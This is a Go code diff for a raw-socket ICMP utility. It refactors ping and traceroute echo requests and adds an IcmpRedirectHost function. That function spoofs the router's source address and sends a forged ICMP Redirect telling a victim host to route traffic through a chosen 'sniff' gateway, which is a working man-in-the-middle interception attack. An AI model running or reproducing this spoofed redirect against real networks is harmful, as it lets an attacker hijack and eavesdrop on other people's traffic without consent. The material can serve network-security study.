@@ -16,6 +16,15 @@ func noresponse() {
 	os.Exit(1)
 }
 
+func initIPRawSocket() (fd int) {
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
+	if err != nil || fd < 0 {
+		fmt.Println("ERROR, creating raw socket")
+		os.Exit(1)
+	}
+	return
+}
+
 func initSocket() (fd int) {
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
 	if err != nil || fd < 0 {
@@ -40,7 +49,7 @@ func ReceiveAllICMPPackets() {
 	}
 }
 
-// sendICMPPacket is function for sending ICMP packet(ECHO_REQEUST) on remote/localhost machine
+// sendICMPPacket is function for sending ICMP packet on remote/localhost machine
 func sendICMPPacketTo(fd int, destAddr syscall.SockaddrInet4, icmppacket []byte) {
 	err := syscall.Sendto(fd, icmppacket, 0, &destAddr)
 	if err != nil {
@@ -84,8 +93,13 @@ func IsAlive(ipbytes [4]byte) {
 		Addr: ipbytes,
 	}
 	fd := initSocket()
-	icmppacket := createSimpleEchoRequest()
-	sendICMPPacketTo(fd, destAddr, icmppacket)
+	icmphead := CreateSimpleBytesICMPHeader(0x8, 0x0)
+	echoid := rand.Int()
+	icmpdata := []byte{uint8(echoid>>8) & 0xFF, uint8(echoid & 0xFF), 0x0, 0x0}
+	icmppacket := append(icmphead, icmpdata[:]...)
+	packetcsum := icmppacket[2:4]
+	CalculatePacketCsum(icmppacket, &packetcsum)
+	sendICMPPacketTo(fd, destAddr, append(icmppacket, 0x0, 0x0))
 	go noresponse()
 	if receiveICMPPacketFrom(fd, destAddr) {
 		fmt.Println("Host is alive!")
@@ -100,7 +114,12 @@ func TraceRouteWithTTL(ipbytes [4]byte) {
 		Addr: ipbytes,
 	}
 	fd := initSocket()
-	icmppacket := createSimpleEchoRequest()
+	icmphead := CreateSimpleBytesICMPHeader(0x8, 0x0)
+	echoid := rand.Int()
+	icmpdata := []byte{uint8(echoid>>8) & 0xFF, uint8(echoid & 0xFF), 0x0, 0x0}
+	icmppacket := append(icmphead, icmpdata[:]...)
+	packetcsum := icmppacket[2:4]
+	CalculatePacketCsum(icmppacket, &packetcsum)
 	socketF := os.NewFile(uintptr(fd), fmt.Sprintf("sock%v", fd))
 	defer socketF.Close()
 	for i := 1; ; i++ {
@@ -140,32 +159,52 @@ func TraceRouteWithTTL(ipbytes [4]byte) {
 	}
 }
 
-// Function for creating simple echo icmp request
-func createSimpleEchoRequest() []byte {
-	request := make([]byte, 8)
-	request[0] = 0x8
-	request[4] = uint8(rand.Int())
-	calcsum := CalculateСsumPacket(request)
-	request[2] = uint8((calcsum >> 8) & 0xFF)
-	request[3] = uint8(calcsum & 0xFF)
-	return request
-}
+// IcmpRedirectHost function for sending and install custom route in the routing table on the host
+func IcmpRedirectHost(ipbytesto, ipbytesserver, ipbytesrouter, ipbytessniff [4]byte) {
+	fd := initSocket()
+	destAddr := syscall.SockaddrInet4{
+		Port: 0,
+		Addr: ipbytesto,
+	}
 
-// CalculateСsumPacket is function for calc. csum for any packets(IP/ICMP/TCP/UDP etc)
-func CalculateСsumPacket(buf []byte) uint16 {
-	sum := uint32(0)
-	for ; len(buf) >= 2; buf = buf[2:] {
-		sum += uint32(buf[0])<<8 | uint32(buf[1])
+	// syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+
+	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
+		fmt.Println("ERROR, opening IP level | ", err)
+		os.Exit(1)
 	}
-	if len(buf) > 0 {
-		sum += uint32(buf[0]) << 8
-	}
-	for sum > 0xffff {
-		sum = (sum >> 16) + (sum & 0xffff)
-	}
-	csum := ^uint16(sum)
-	if csum == 0 {
-		csum = 0xffff
-	}
-	return csum
+
+	// creating ip head
+	iphead := CreateSimpleStructIPHeader()
+	iphead.setDestAddr(ipbytesserver[:]) // spoof datagram
+	iphead.setSourceAddr(ipbytesto[:])
+	ipheadbytes := ConvertPacketToBytes(iphead)
+	packetcsum := ipheadbytes[10:12]
+	CalculatePacketCsum(ipheadbytes, &packetcsum)
+
+	// creating icmp echo request for packet tail (icmp type 5 -> data is 64 bytes of orig. datagram)
+	icmpechohead := CreateSimpleBytesICMPHeader(0x8, 0x0)
+	echoid := rand.Int()
+	icmpechodata := []byte{uint8(echoid>>8) & 0xFF, uint8(echoid & 0xFF), 0x0, 0x0}
+	icmpechopacket := append(icmpechohead, icmpechodata[:]...)
+	packetechocsum := icmpechopacket[2:4]
+	CalculatePacketCsum(icmpechopacket, &packetechocsum)
+
+	origdatagram := append(ipheadbytes, icmpechohead...)
+
+	iphead.setDestAddr(ipbytesto[:])
+	iphead.setSourceAddr(ipbytesrouter[:])
+	ipheadbytes = ConvertPacketToBytes(iphead)
+
+	// creating icmp redirect host request
+	icmpredirecthead := CreateSimpleBytesICMPHeader(0x5, 0x1)
+	icmpredirectdata := append(ipbytessniff[:], origdatagram[:]...)
+	icmpredirectpacket := append(icmpredirecthead, icmpredirectdata[:]...)
+	packetredirectcsum := icmpredirectpacket[2:4]
+	CalculatePacketCsum(icmpredirectpacket, &packetredirectcsum)
+
+	resultpacket := append(append(ipheadbytes, icmpredirectpacket...))
+
+	syscall.Sendto(fd, resultpacket, 0, &destAddr)
+	os.Exit(0)
 }
